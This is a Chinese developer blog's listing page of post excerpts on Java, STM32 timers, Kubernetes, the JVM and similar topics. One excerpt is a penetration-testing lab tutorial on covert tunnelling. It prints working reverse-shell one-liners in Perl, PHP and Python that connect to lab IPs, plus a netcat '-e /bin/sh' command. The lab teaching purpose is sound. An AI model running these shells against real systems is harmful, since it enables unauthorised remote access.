		<a class="list__footer-readmore btn" href="/posts/4f69a9863c070c05a00001a3132a7dfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/427f28bbac64f8dbbf64665e5c395770/" rel="bookmark">
			隐藏通信隧道技术（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、传输层隧道技术
1.Netcat获取shell（反向shell）
第一种：如果目标主机安装nc
第二种：目标主机没有安装nc，使用php也可以反弹shell
第三种：使用Python反弹shell 2.Netcat搭建内网代理获取shell
Powercat工具的使用 1.powercat获取正向shell
2.powercat获取反向shell 3..powercat文件传输
4.powercat做代理
二、应用层隧道技术
1.SSH协议隧道技术
1.环境搭建
2.ssh常见建立ssh隧道所用到的参数 3.ssh-本地端口转发
4.ssh-远程端口转发
5.ssh-动态端口转发
2.HTTP协议隧道技术
1.工具：reGeorg: 2.常见参数说明
3.复现
3.socks代理
1.socks简介
2.socks代理与端口转发的区别
3.工具：Earthworm（EW） socks二级级联
多级级联：Lcx_listen、lcx_slave的用法：
4.压缩数据
4.1 工具：WINRAR
5.上传下载
5.1利用FTP协议上传，需要ftp账户和密码
5.2利用VBS和VPS上传
5.3利用bitsadmin下载
一、传输层隧道技术 1.Netcat获取shell（反向shell） 第一种：如果目标主机安装nc 在本地监听5555端口 在目标主机上输入一下payload Socket;$i="10.2.1.170";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' 在本机查看shell已经反弹 第二种：目标主机没有安装nc，使用php也可以反弹shell 首先还是在本地监听5555端口然后再目标主机输入一下payload php -r '$sock=fsockopen("10.2.1.170",5555);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 然后查看本地主机发现反弹shell成功
第三种：使用Python反弹shell python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.3.19",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2.Netcat搭建内网代理获取shell 原理：公网服务器（kali2019）将web服务器（kali2021）作为代理访问内网的服务器(windows7)
首先在自己的服务器监听端口 然后将nc的脚本程序放到目标主机上，然后将shell放到配置好的端口下
Nc –lvp 5555 –e /bin/sh linux系统
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/427f28bbac64f8dbbf64665e5c395770/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d6591328e38abde67c24b41ea9cb483/" rel="bookmark">
			el-layout &#43; vxetable 动态高度问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 按比例实现下面布局，且随页面大小高度比率不变
实现核心，就是对header 、table 、main 的style加上动态高度即可
height:calc(100vh / 2 - 50px)
升级版效果图
使用拆分组件
//官方文档：https://gitee.com/bi2008/vue-page-split import SplitPane from "vue-page-split"; echar自适应
//页面改动重新渲染echar window.addEventListener("resize", () =&gt; { this.handleCellEvent({ row: this.currentSelectRow }); }); //分割移动重新渲染echar onresizeLineEndMove: function() { console.log("onresizeLineEndMove"); this.handleCellEvent({ row: this.currentSelectRow }); }, //核心重新触发页面渲染 chart.resize(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/832e2ca3379157bb9cac19069363d734/" rel="bookmark">
			javaEE基础 —— 线程的状态和安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、线程的状态
1.new
2.terminated
3.runnable 4.timed_waiting
5.blocked 6.waiting
二、线程安全
1.线程安全的概念
2.线程不安全的原因
一、线程的状态 先前，我们大概介绍了一下线程的两个状态：阻塞和就绪。严格来说线程并不只有这两种状态，上述的两种状态是在系统层面上的线程状态，在Java中，尤其是Thread类之中一共将线程的状态表分成了六种。
1.new 当Thread对象创建好了，但线程并未执行 示例代码：
public static void main(String[] args) { Thread t = new Thread(() -&gt; { }); System.out.println(t.getState()); } 运行结果：
2.terminated 线程已经运行结束，但是Thread对象还在
示例代码：
public static void main(String[] args) { Thread t = new Thread(() -&gt; { }); t.start(); try { t.join(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(t.getState()); } 运行结果： 需要注意的是，上述两个状态是Java自身定义的，和操作系统中的PCB状态没有关系。
3.runnable 这就是我们时常说的就绪状态，这时线程有两种情况：
1.正在被执行
2.没有被调度执行，但随时可以去调度它
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/832e2ca3379157bb9cac19069363d734/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8aae828048a7c0fc3f65b0b9eeafc20d/" rel="bookmark">
			单片机(STM32)内部RC振荡器误差时间到底有多少
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		此例以STM32单片机为例来进行分析. 定时器每1ms的上下误差是多少us 先看数据表给出的误差值
可以看出 此单片机内部的高速RC振荡器的标准频率是16Mhz.
在标称电压不考虑温漂的情况下 误差上下 不超过 1% 即 15.88MHz — 16.08MHz
而考虑温漂(负温漂)就会高达到2% 即 16*0.02 = 0.32Mhz 即 15.68MHz — 16.32MHz
那我们就以最大的误差 2%(15.68MHz — 16.32MHz) 来分析 1ms的定时器 误差会有多少us?
分析之前,我们要先知道当前 单片机定时器的一个计数 需要消耗的周期 是 时钟周期 还是机器周期 还是指令周期
通常 定时器的 计数周期为 时钟周期 即主频, 以下以时钟周期为例进行分析
我们假设单片机进行16分频 此时的误差频率为 (0.98MHz — 1.02MHz)
此时计时 1S 需要进行 980000 ---- 1020000 次的 节拍计数
计时 1ms 需要进行 980 — 1020 次的 节拍计数
而1ms = 1000us
所以 定时1ms的误差 时间为 ±20us 1s的误差为±20ms
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8aae828048a7c0fc3f65b0b9eeafc20d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c98997c069bec729fe1c4621e31e666a/" rel="bookmark">
			语义分割评价指标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		语义分割评估标准：
常用的就是：
global acc(有的地方叫PA)，mAcc（有的地方貌似叫MPA） ，mIoU
mIoU貌似用的是最最多的，很多论文在展示结果的时候都只个mIoU 下边这张图看不懂不用慌！
指标的计算方法（混淆矩阵）：
1.global acc：
2.mAcc
这五个值相加取平均就得到了mAcc
3.mIoU
同理这五个iou相加再取平均就得到了mIOU
总结：
实际意义：
miou越大代表你预测出来的分割区域越与真实的标签区域相重合（相似），你的模型越好，我觉得对于mean-acc差不多也是这个道理。
注意一点的是：有个令人混淆的地方，global acc也叫PA ，mAcc有的地方好像叫MPA，这两个貌似是有点不太一样
Global Acc（PA）是全局的，就一个，不分类别 。mAcc（MPA）先是有不同类别acc的然后所有类别求和取平均得到mAcc 就是比如一张图：
PA（global Acc）就是：所有正确的像素数(不管类别)/一张图所有的像素数
cla-acc =某个类别正确的数/这张图这个类的真实的像素的总数
cls-iou就是你预测的这个类分割出来的正确区域面积/预测的区域和实际的区域面积之和
以上是自己做的笔记自己看的，如果有错误的地方，非常非常欢迎大佬们指正！！
参考：
http://t.csdn.cn/Fk7u8
https://www.bilibili.com/video/BV1ev411P7dR/?spm_id_from=333.788.recommend_more_video.0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baa346698cfd43b596025af220938cd5/" rel="bookmark">
			隐藏通信隧道技术(上)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、防火墙的配置
二、kali虚拟机网卡配置
三、隐藏隧道技术的基础知识
1.什么是隧道技术：
2.检测内网连通性
3.利用icmp创建隧道
（1）使用的工具： icmpsh
（2）工具：Pingtunnel
4.传输层隧道技术
4.1使用nc工具创建隧道
一、防火墙的配置 1..首先进去防火墙，此时我们需要配置符合自己环境的ip
2. 先配置lan ip
首先需要输入2，配置ip地址（仅主机）输入子网掩码位数是否需要dhcp服务注意：此时需要配置仅主机模式的ip，如果没有仅主机的网卡就自己手动添加一个 3..然后继续配置wan的ip地址
使用设置号的lan ip地址在浏览器输入然后输入密码与账号登录 最后点击保存即可
然后重启防火墙即可
二、kali虚拟机网卡配置 auto eth0 iface eth0 inet static address 10.2.1.88 netmask 255.255.255.0 gateway 10.2.1.8 auto eth1 iface eth1 inet static address 172.31.1.88 netmask 255.255.255.0 gateway 172.31.1.2 配置kali2019的网卡
auto eth0 iface eth0 inet static address 10.2.1.170 netmask 255.255.255.0 gateway 10.2.1.1 尝试是否可以内网互通
（1）查看是否可以ping通外网
（2）查看是否可以ping通web服务器
此时环境搭建成功
三、隐藏隧道技术的基础知识 1.什么是隧道技术： 隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。
2.检测内网连通性 icmp :pingtcp: nc ip porthttp: curl ip :portdns :nslookup www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/baa346698cfd43b596025af220938cd5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5298316454cb46b059b5fe5355220def/" rel="bookmark">
			STM32定时器的定时时间设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 定时1ms
定时器定时频率=时钟源频率/ [(PSC+1)(ARR+1)]=16M/[(15+1)(999+1)]=1000Hz，所以定时的时间为1ms.
简单理解 16M的意思是1S可以计数 16000000 次
先进行16预分频 1S可以计数1000000 次
此时, 1ms可以计数1000 次
所以1ms的自动重装值是 1000
也就是从0 计数到1000 后 1ms 也就到了
定时1S
定时器定时频率=时钟源频率/ [(PSC+1)(ARR+1)]=16M/[(1599+1)(9999+1)]=1，所以定时的时间为1s.
预分频1600
定时10ms
定时器定时频率=时钟源频率/ [(PSC+1)(ARR+1)]=16M/[(15+1)(999+1)]=1000Hz，所以定时的时间为1s.
定时器有如下三种计数模式：(上面采用的是递增计数模式)
递增计数模式：计数器从 0 计数到自动重载值，然后重新从 0 开始计数并生成计数器上溢事件。
递减计数模式：计数器从自动重载值开始递减到 0，然后重新从自动重载值开始计数并生成计数器下溢事件。
中心对齐模式：计数器从 0 开始计数到自动重载值 – 1 ，生成计数器上溢事件；然后从自动重载值开始向下计数到 1 并生成计数器下溢事件。之后从0 开始重新计数。
最后别忘记 在初始化之后启动定时中断
HAL_TIM_Base_Start_IT(&amp;htim17); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3661f6acc9844a61da1f3ccc405da128/" rel="bookmark">
			####好好好#####时序数据库介绍和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.基础
1.1 时序数据的定义
什么是时间序列数据（Time Series Data，TSD，以下简称时序）从定义上来说，就是一串按时间维度索引的数据。用描述性的语言来解释什么是时序数据，简单的说，就是这类数据描述了某个被测量的主体在一个时间范围内的每个时间点上的测量值。它普遍存在于IT基础设施、运维监控系统和物联网中。
对时序数据进行建模的话，会包含三个重要部分，分别是：主体，时间点和测量值。套用这套模型，你会发现你在日常工作生活中，无时无刻不在接触着这类数据。
如果你是一个股民，某只股票的股价就是一类时序数据，其记录着每个时间点该股票的股价。
如果你是一个运维人员，监控数据是一类时序数据，例如对于机器的CPU的监控数据，就是记录着每个时间点机器上CPU的实际消耗值。
时序数据从时间维度上将孤立的观测值连成一条线，从而揭示软硬件系统的状态变化。孤立的观测值不能叫时序数据，但如果把大量的观测值用时间线串起来，我们就可以研究和分析观测值的趋势及规律。
1.2 时序数据的特点
1.2.1 时序数据的数学模型
上面介绍了时序数据的基本概念，也说明了分析时序数据的意义。那么时序数据该怎样存储呢？数据的存储要考虑其数学模型和特点，时序数据当然也不例外。所以这里先介绍时序数据的数学模型和特点。
下图为一段时序数据，记录了一段时间内的某个集群里各机器上各端口的出入流量，每半小时记录一个观测值。这里以图中的数据为例，介绍下时序数据的数学模型（不同的时序数据库中，基本概念的称谓有可能不同，这里以腾讯CTSDB为准）：
measurement： 度量的数据集，类似于关系型数据库中的 table；
point： 一个数据点，类似于关系型数据库中的 row；
timestamp： 时间戳，表征采集到数据的时间点；
tag： 维度列，代表数据的归属、属性，表明是哪个设备/模块产生的，一般不随着时间变化，供查询使用；
field： 指标列，代表数据的测量值，随时间平滑波动，不需要查询。
如上图所示，这组数据的measurement为Network，每个point由以下部分组成：
timestamp：时间戳
两个tag：host、port，代表每个point归属于哪台机器的哪个端口
两个field：bytes_in、bytes_out，代表piont的测量值，半小时内出入流量的平均值
同一个host、同一个port，每半小时产生一个point，随着时间的增长，field（bytes_in、bytes_out）不断变化。如host：host4，port：51514，timestamp从02:00 到02:30的时间段内，bytes_in 从 37.937上涨到38.089，bytes_out从2897.26上涨到3009.86，说明这一段时间内该端口服务压力升高。
1.2.2 时序数据特点
数据模式： 时序数据随时间增长，相同维度重复取值，指标平滑变化：这点从上面的Network表的数据变化可以看出。
写入： 持续高并发写入，无更新操作：时序数据库面对的往往是百万甚至千万数量级终端设备的实时数据写入（如摩拜单车2017年全国车辆数为千万级），但数据大多表征设备状态，写入后不会更新。
查询： 按不同维度对指标进行统计分析，且存在明显的冷热数据，一般只会频繁查询近期数据。
1.3 时序数据的存储
1.3.1 传统关系型数据库存储时序数据的问题
有了时序数据后，该存储在哪里呢？首先我们看下传统的关系型数据库解决方案在存储时序数据时会遇到什么问题。
很多人可能认为在传统关系型数据库上加上时间戳一列就能作为时序数据库。数据量少的时候确实也没问题。但时序数据往往是由百万级甚至千万级终端设备产生的，写入并发量比较高，属于海量数据场景。
MySQL在海量的时序数据场景下存在如下问题：
存储成本大：对于时序数据压缩不佳，需占用大量机器资源；
维护成本高：单机系统，需要在上层人工的分库分表，维护成本高；
写入吞吐低：单机写入吞吐低，很难满足时序数据千万级的写入压力；
查询性能差：适用于交易处理，海量数据的聚合分析性能差。
另外，使用Hadoop生态（Hadoop、Spark等）存储时序数据会有以下问题：
数据延迟高：离线批处理系统，数据从产生到可分析，耗时数小时、甚至天级；
查询性能差：不能很好的利用索引，依赖MapReduce任务，查询耗时一般在分钟级。
可以看到时序数据库需要解决以下几个问题：
时序数据的写入：如何支持每秒钟上千万上亿数据点的写入。
时序数据的读取：如何支持在秒级对上亿数据的分组聚合运算。
成本敏感：由海量数据存储带来的是成本问题。如何更低成本的存储这些数据，将成为时序数据库需要解决的重中之重。
1.3.2 时序数据库
***时序数据库产品的发明都是为了解决传统关系型数据库在时序数据存储和分析上的不足和缺陷，这类产品被统一归类为时序数据库。***针对时序数据的特点对写入、存储、查询等流程进行了优化，这些优化与时序数据的特点息息相关：
存储成本：
利用时间递增、维度重复、指标平滑变化的特性，合理选择编码压缩算法，提高数据压缩比；
通过预降精度，对历史数据做聚合，节省存储空间。
高并发写入：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3661f6acc9844a61da1f3ccc405da128/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/256134e2ceb082291b9dcd95aa868916/" rel="bookmark">
			free(): invalid next size (fast):错误及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		./a.out: free(): invalid next size (fast): 0x000000000c29d010 ***
今天在翻写算法的时候，出现了以上的错误
这种错误的原因：
一般是对内存进行非法的写操作，然后free的时候就会报上面的错误
贴源码：
我这边malloc的时候是申请的50个字节的内存大小（原本的意思是要申请50*8个字节的大小的）。原本的意思是要申请50*8的内存大小，存放50个double类型的变量的。
结果可能是之前开发的时候，一直是申请的char 类型的malloc，所以这边误以为malloc参数是50的话，就是50个变量的大小，结果造成了越界的操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d487487e42a486a574c62ccb1e3a40e/" rel="bookmark">
			win10系统磁盘清理，临时文件删不掉 的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、我们有时在C盘磁盘清理时，会遇到这种情况：临时文件怎么也清除不掉
2、解决方案一
2.1.按下 window键，打开 设置
2.2.依次点击 系统-存储-临时文件
2.3.删除文件 即可
2.4、注意！！！大家可以打开系统自动清理，这样系统就会自动删除多余文件，释放存储空间。
操作方法：点击 存储-存储感知
3、解决方案二：手动强制删除临时文件
键盘输入win+R
再输入 %tmp% 回车后 打开临时文件所在目录
手动选中 临时文件删除即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40aa42dfe3a324de2a5d6c777e8cbffb/" rel="bookmark">
			接口知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.1 接口的概述1.2 接口的定义格式1.2.1含有抽象方法 1.3接口使用步骤1.3.1含有默认方法和静态方法1.3.2静态方法的使用 1.1 接口的概述 接口，是Java语言中一种引用类型，是方法的集合，如果说类的内部封装了成员变量、构造方法和成员方法，那么 接口的内部主要就是封装了方法，包含抽象方法（JDK 7及以前），默认方法和静态方法（JDK 8），私有方（JDK 9）。
接口的定义，它与定义类方式相似，但是使用 interface 关键字。它也会被编译成.class文件，但一定要明确它不是类，而是另外一种引用数据类型。
1.2 接口的定义格式 public class Demo1 { /* 接口就是多个类的公共规范 接口是一种引用数据类型，最重要的内容就是其中的抽象方法 如何定义一个接口？ public interface 接口名称{ 接口内容 } 备注：换成了关键字interface之后，编译生成的字节码文件仍然是：.java--&gt;.class 如果是java7：那么接口中可以包含的内容有： 1.常量 2.抽象方法 如果是java8：可以额外包涵有: 3.默认方法 4.静态方法 如果是java9，还可以额外包涵有： 5.私有方法 */ } public interface 接口名称 { // 抽象方法 // 默认方法 // 静态方法 // 私有方法 } 1.2.1含有抽象方法 抽象方法：使用 abstract 关键字修饰，可以省略，没有方法体。该方法供子类实现使用。
代码如下：
/* 在任何版本的java中，接口都能定义抽象方法 格式： public abstract 返回值类型 方法名称（参数列表）； 注意事项： 1. 接口当中的抽象方法，修饰符必须是两个固定的关键字， public abstract 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40aa42dfe3a324de2a5d6c777e8cbffb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8a5bbdbe063de6d3cb34eb5ce93aa0a/" rel="bookmark">
			JavaScript基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目标： 目录
JavaScript概述
JavaScript的注意
JavaScript中的变量
JavaScript的运算符
JavaScript概述
JavaScript 简称 JS 是用于制作网页的动态效果的，如：页面的弹出广告、浮动广告、 下拉菜单、表单验证等功能都由 JavaScript 完成;JS 是嵌入在网页中的一个脚本语言; 不像 Java 一样庞大，但它的灵活度高；
JavaScript的注意
1.&lt;script&gt;&lt;/script&gt;代码应该书写到
中或者页面的结束位置。
2.JavaScript区分大小写。
3.JavaScript是一个弱语言脚本。比较灵活。
JavaScript中的变量
变量：值可以发生改变的量。
常量：值不能发生改变的量。
如何定义变量
let 变量名 [= 值]; //[]代表可以省略 /* 变量的命名规则： 1.字母、数字、下划线_、$和中文。 2.数字不能在首位。 3.不能使用关键字和保留字。 变量的命名规范： 1.首字母小写。 2.不能使用中文。 3.如果多个单词组成的名称，其后单词首字母大写，驼峰。userage--&gt;userAge 4.不要使用混搭式写法,yonghuAge错误 正确应该： yongHuNianLing|userAge 5.尽量使用有含义的名词单词 */ JavaScript的运算符 算术运算符 let c1 = a + b; let c2 = a - b; let c3 = a * b; let c4 = a / b; let c5 = a % b; 赋值运算符 let a = 6; // 将6的值赋予了a 关系运算符 let c1 = (a === b); //比较a和b的值是否相等 返回一个true|false的结果 let c2 = (a !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8a5bbdbe063de6d3cb34eb5ce93aa0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47b1c52784efec39d58d6b08e845bd74/" rel="bookmark">
			kubernetes建立容器以及可视化界面集群管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本文主要讲述在kubernetes上基于ipv4、ipv6双栈集群建立容器以及可视化界面的集群管理。本来我打算不用双栈节点部署pod，但是建立之后，发现我所使用的cni似乎不支持（我使用的是calico）纯ipv6的建立，使用如下命令查看时会发现一直处于ContainerCreating状态，可能由于该网络插件不支持的关系，之后的实验我将尝试使用各种不同的网络插件，查看它们的效果以及是否支持。
kubectl get pod -n kube-system 所以我决定本次实验使用ipv4、ipv6双栈集群进行部署。
部署容器 前面的基本部署的操作与之前的实验都是一样，如果不知道可以点击下方链接查看我的另一篇文章。
kubernetes建立ipv4、ipv6双栈集群_weixin_53682254的博客-CSDN博客https://blog.csdn.net/weixin_53682254/article/details/123946528下面正式开始部署容器。
首先在master节点的主机上输入以下命令，建立nginx容器，注意，在部署容器之前一定要先部署好cni网络，不然容器会一直处于ContainerCreating状态。
kubectl create deployment nginx --image=nginx 打开服务端口，命令如下：
kubectl expose deployment nginx --port 80 --type=NodePort 查看容器是否运行：
kubectl get pod,svc 可以使用以下命令查看部署在哪个节点上：
kubectl get pods -o wide 然后使用node节点的ip加上对外访问的端口访问该服务，如下图所示：
部署可视化集群管理 执行以下命令来运行Kuboard v3
kubectl apply -f https://addons.kuboard.cn/kuboard/kuboard-v3.yaml 使用以下命令查看Kuboard v3是否running，以及端口号 kubectl get pods,svc -n kuboard 然后使用master节点的ip地址加上端口号30080访问Kuboard，会出现如下图所示的登录界面，默认的账号是admin，密码为Kuboard123
登录之后的界面如下图所示，可以实现可视化集群管理
总结 本文对于在双栈环境下部署容器以及可视化管理进行了基础的学习，接下来我将尝试各种不同的cni，查看不同网络插件对于ipv6的支持程度以及效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bce504f42743a3e165fd41df0fd7eba8/" rel="bookmark">
			java JVM - CMS垃圾回收机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试官：今天还是来聊聊CMS垃圾收集器呗？
候选者：嗯啊…
候选者：如果用Seria和Parallel系列的垃圾收集器：在垃圾回收的时，用户线程都会完全停止，直至垃圾回收结束！
候选者：CMS的全称：Concurrent Mark Sweep，翻译过来是「并发标记清除」
候选者：用CMS对比上面的垃圾收集器(Seria和Parallel和parNew)：它最大的不同点就是「并发」：在GC线程工作的时候，用户线程「不会完全停止」，用户线程在「部分场景下」与GC线程一起并发执行。
候选者：但是，要理解的是，无论是什么垃圾收集器，Stop The World是一定无法避免的！
候选者：CMS只是在「部分」的GC场景下可以让GC线程与用户线程并发执行
候选者：CMS的设计目标是为了避免「老年代 GC」出现「长时间」的卡顿（Stop The World）
面试官：那你清楚CMS的工作流程吗？
候选者：只了解一点点，不能多了。
候选者：CMS可以简单分为5个步骤：初始标记、并发标记、并发预清理、重新标记以及并发清除
候选者：从步骤就不难看出，CMS主要是实现了「标记清除」垃圾回收算法
面试官：嗯…是的
候选者：我就从「初始标记」来开始吧
候选者：「初始标记」会标记GCRoots「直接关联」的对象以及「年轻代」指向「老年代」的对象
候选者：「初始标记」这个过程是会发生Stop The World的。但这个阶段的速度算是很快的，因为没有「向下追溯」（只标记一层）
候选者：在「初始标记」完了之后，就进入了「并发标记」阶段啦
候选者：「并发标记」这个过程是不会停止用户线程的（不会发生 Stop The World）。这一阶段主要是从GC Roots向下「追溯」，标记所有可达的对象。
候选者：「并发标记」在GC的角度而言，是比较耗费时间的（需要追溯）
候选者：「并发标记」这个阶段完成之后，就到了「并发预处理」阶段啦
候选者：「并发预处理」这个阶段主要想干的事情：希望能减少下一个阶段「重新标记」所消耗的时间
候选者：因为下一个阶段「重新标记」是需要Stop The World的
面试官：嗯…
候选者：「并发标记」这个阶段由于用户线程是没有被挂起的，所以对象是有可能发生变化的
候选者： 可能有些对象，从新生代晋升到了老年代。可能有些对象，直接分配到了老年代（大对象）。可能老年代或者新生代的对象引用发生了变化…
面试官：那这个问题，怎么解决呢？
候选者：针对老年代的对象，其实还是可以借助类card table的存储（将老年代对象发生变化所对应的卡页标记为dirty）
候选者：所以「并发预处理」这个阶段会扫描可能由于「并发标记」时导致老年代发生变化的对象，会再扫描一遍标记为dirty的卡页
面试官：嗯…
候选者：对于新生代的对象，我们还是得遍历新生代来看看在「并发标记」过程中有没有对象引用了老年代…
候选者：不过JVM里给我们提供了很多「参数」，有可能在这个过程中会触发一次 minor GC（触发了minor GC 是意味着就可以更少地遍历新生代的对象）
候选者：「并发预处理」这个阶段阶段结束后，就到了「重新标记」阶段
候选者：「重新标记」阶段会Stop The World，这个过程的停顿时间其实很大程度上取决于上面「并发预处理」阶段（可以发现，这是一个追赶的过程：一边在标记存活对象，一边用户线程在执行产生垃圾）
候选者：最后就是「并发清除」阶段，不会Stop The World
候选者：一边用户线程在执行，一边GC线程在回收不可达的对象
候选者：这个过程，还是有可能用户线程在不断产生垃圾，但只能留到下一次GC 进行处理了，产生的这些垃圾被叫做“浮动垃圾”
候选者：完了以后会重置 CMS 算法相关的内部数据，为下一次 GC 循环做准备
面试官：嗯，CMS的回收过程，我了解了
面试官：听下来，其实就是把垃圾回收的过程给”细分”了，然后在某些阶段可以不停止用户线程，一边回收垃圾，一边处理请求，来减少每次垃圾回收时 Stop The World的时间
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bce504f42743a3e165fd41df0fd7eba8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f535f27a4fbf29646b6e1ca076045360/" rel="bookmark">
			redis服务器 本地连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我所用的是阿里服务器 安全组 6379端口一定要开启来
redis 配置文件修改
这个是宝塔页面的配置 直接配置文件修改走起
如果想用命令行 可以网上找一下(也挺简单的)
修改完配置文件后
记得要重启一下redis
防火墙的开启端口
# 开启端口 xxxx对应的你想要开启的端口号 记得要在阿里云安全组开启 开端口命令：firewall-cmd --zone=public --add-port=6379/tcp --permanent 重启防火墙：systemctl restart firewalld.service 然后就可以在自己的可视化软件上面用了
(如果没有好的软件 推荐一下可视化软件 Another Redis Desktop Manager )
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e7fbe1f304c8deda9c84df1ba11433d/" rel="bookmark">
			总结下研一小白入门pytorch时遇到的基础问题（只求自己能看懂篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.numpy到底是什么？
numpy是python中的一个库，主要用于矩阵和数组的运算。
2.pytorch深度学习框架 那么深度学习框架是什么意思？
在其他文章里看到一个很好的解释，对我这种理解力低下的小白很友好。深度学习框架好比是一套积木，每一块小积木就是其中的一个库or包，你想怎么搭建这个积木都可以，总之这套积木里有你需要的所有小积木。
3.张量（tensor）是什么？
这是个困扰我很久并且继续困扰下去的问题。张量就是，在不同参考系下按照某种特定法则进行变换的量。这句话我到现在还是一知半解，关于什么是张量，我已经看到了许多个版本的解释，因为我参不透本质，所以每个版本说的都不一样。但是在知乎上看到一篇帖子解释张量还是比较容易懂的，帖子中大体意思是说：用物理学观点来解释张量，比如Bob认为粒子的能动量是（Ea，Pa），而Andy则认为是（Eb，Pb），Bob和Andy都没有说错，因为（Ea，Pa）和（Eb，Pb）是可以通过一定条件相互转换的，二者只是参考系的不同，Andy和Bob各自的参考系并没有哪一个更优越一说，于是我们干脆都舍弃，这个粒子的能动量就由张量T来表示，所以物理学定义就出来了，张量是一个不随坐标而改变的，物理系统内在的量。而在数学家眼里，张量就类似于线性变换，不依赖与线性空间中基的选取。不管是物理还是数学，张量都是可根据参考系而发生相应变换的量。
4.有关GPU
（1）NVIDIA是什么
NVIDIA，中文名叫英伟达（在很多笔记本电脑的标签上经常可以看到），英伟达是一家人工智能公司，说白了就是一家能生产显卡的厂商，英伟达发明了GPU，彻底改变了并行计算，由此可见，GPU是可以加快程序效率并可以实现并行计算处理的。
（2）CUDA是什么
cuda是显卡厂商NVIDIA推出的运算平台。是一种通用并行计算得架构，可以使GPU能够解决复杂的计算问题。目前cuda只支持linux和win系统，进行cuda开发需要一次安装驱动、toolkit、SDK三个软件，安装cuda是为了使用GPU加速。
（3）GPU
显卡的处理器称为图形处理器（Graphics Processing Unit，GPU）。gpu是专为执行复杂的数学和几何计算而设计的。
5.各种代码细节问题
①/和// :/表示除法；//表示向下取整的除法
②带lib后缀的代码是指library库
③代码中dim的含义，dim即dimension，是指维度，有关dim，我找到一个博主写的非常容易理解且详细，附上链接Python-维度dim的定义及其理解使用_静静喜欢大白的博客-CSDN博客_python中dim
为了保存文字 我再复制一遍：
目录
一、dim的定义
二、dim 的理解
三、举例
torch.argmax()
sum()
cumsum()
